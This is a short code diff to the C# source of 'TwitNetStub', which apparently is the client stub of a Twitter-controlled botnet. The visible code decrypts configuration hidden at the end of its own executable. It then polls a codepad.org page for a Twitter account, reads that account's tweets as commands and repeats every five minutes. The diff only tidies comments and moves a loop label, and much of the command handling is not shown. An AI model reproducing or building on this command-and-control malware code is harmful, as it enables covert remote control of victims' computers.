@@ -1,14 +1,6 @@
 ﻿/*
  * TODO:
- * - Timer for checking tweets
- * ---------done, checkTwitter() loops every 5 mins
- * - Some way to make sure operations don't loop, like updating that only needs to be done once. 
- * --------- Elaborate^
  * - Way more operations
- * - Store config as encrypted xml 
- * ---------why? would increase the EOF data
- * - Write custom encryption algorithm
- * ---------why not just use AES?
  */
 
 using System.Text;
@@ -47,7 +39,6 @@ namespace TwitNetStub
             //Grab file contents
             byte[] stub = File.ReadAllBytes(Application.ExecutablePath);
 
-
             string appendData = Strings.Split(Encoding.Default.GetString(stub), Constants.Splitter, -1, CompareMethod.Text)[1];
             SimpleAES defaultAES = new SimpleAES(true);
             appendData = defaultAES.Decrypt(Encoding.Default.GetBytes(appendData));
@@ -73,10 +64,10 @@ namespace TwitNetStub
 
         private void checkTwitter()
         {
+            Label_1:
             WebClient client = new WebClient();
             string command;
             string arg;
-        Label_1:
             string codepad = client.DownloadString("http://" + Variables.CodePadURL + ".codepad.org/");
             string twitUser = Regex.Split(codepad, "<pre>http://twitter.com/")[1].Split('<')[0].Trim();
 
@@ -139,12 +130,6 @@ namespace TwitNetStub
             Variables.LastTweet = tweet;
             Thread.Sleep(300000);
             goto Label_1;
-            //this will loop the operation until
-            //finished is thrown up, so make sure you toss it
-            /*while (!op.Finished)
-            {
-                op.Run();
-            }*/
         }
     }
 }
